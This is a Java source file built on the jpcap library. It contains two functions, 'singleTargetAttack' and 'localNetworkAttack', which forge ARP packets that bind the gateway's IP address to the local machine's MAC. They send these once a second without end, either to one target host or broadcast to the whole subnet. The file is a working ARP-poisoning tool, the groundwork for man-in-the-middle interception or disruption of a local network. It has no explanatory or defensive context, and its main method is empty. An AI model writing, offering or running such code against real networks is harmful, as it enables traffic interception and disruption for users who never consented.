import JavaBean.ARPBean;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Arrays;

import static java.lang.Thread.sleep;

public class Main {

    private static byte[] getMac(String originalData){
        byte[] mac = new byte[]{(byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00};
        String[] temp = originalData.split("-");
        for (int x = 0; x < temp.length; x++){
            mac[x] = (byte)(Integer.parseInt(temp[x],16) & 0xff);
        }
        return mac;
    }

    public static Thread singleTargetAttack(ARPBean arpBean) throws Exception{
        InetAddress destinationIp = InetAddress.getByName(arpBean.getTargetIP());
        InetAddress gateWayIp = InetAddress.getByName(arpBean.getGateWay());
        jpcap.NetworkInterface[] networkInterfaces = JpcapCaptor.getDeviceList();
        jpcap.NetworkInterface networkDevice = networkInterfaces[1];
        JpcapSender sender = JpcapSender.openDevice(networkDevice);

        ARPPacket arpPacket = new ARPPacket();
        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
        arpPacket.operation = ARPPacket.ARP_REQUEST;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.target_hardaddr = getMac(arpBean.getTargetMac());
        arpPacket.target_protoaddr = destinationIp.getAddress();
        arpPacket.sender_hardaddr = getMac(arpBean.getLocalMac());
        arpPacket.sender_protoaddr = gateWayIp.getAddress();

        EthernetPacket ethernetPacket = new EthernetPacket();
        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethernetPacket.dst_mac = getMac(arpBean.getTargetMac());
        ethernetPacket.src_mac = getMac(arpBean.getLocalMac());
        arpPacket.datalink = ethernetPacket;
        Thread tt = new Thread(() -> {
            while (true) {
                System.out.println("sending arp..");
                sender.sendPacket(arpPacket);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        tt.start();
        return tt;
    }

    public static Thread localNetworkAttack(ARPBean arpBean) throws Exception{
        InetAddress destinationIp = InetAddress.getByName(arpBean.getTargetIP());
        InetAddress gateWayIp = InetAddress.getByName(arpBean.getGateWay());
        jpcap.NetworkInterface[] networkInterfaces = JpcapCaptor.getDeviceList();
        jpcap.NetworkInterface networkDevice = networkInterfaces[1];
        JpcapSender sender = JpcapSender.openDevice(networkDevice);

        ARPPacket arpPacket = new ARPPacket();
        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
        arpPacket.operation = ARPPacket.ARP_REQUEST;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.target_hardaddr = getMac("ff-ff-ff-ff-ff-ff");
        arpPacket.target_protoaddr = destinationIp.getAddress();
        arpPacket.sender_hardaddr = getMac(arpBean.getLocalMac());
        arpPacket.sender_protoaddr = gateWayIp.getAddress();

        EthernetPacket ethernetPacket = new EthernetPacket();
        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethernetPacket.dst_mac = getMac("ff-ff-ff-ff-ff-ff");
        ethernetPacket.src_mac = getMac(arpBean.getLocalMac());
        arpPacket.datalink = ethernetPacket;
        Thread t = new Thread(() -> {
            while (true) {
                System.out.println("sending arp..");
                sender.sendPacket(arpPacket);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        t.start();
        return t;
    }



    public static void main(String[] args) throws Exception {
        int delay = 2;
        /*System.out.println(System.getProperty("java.library.path"));*/
    }
}
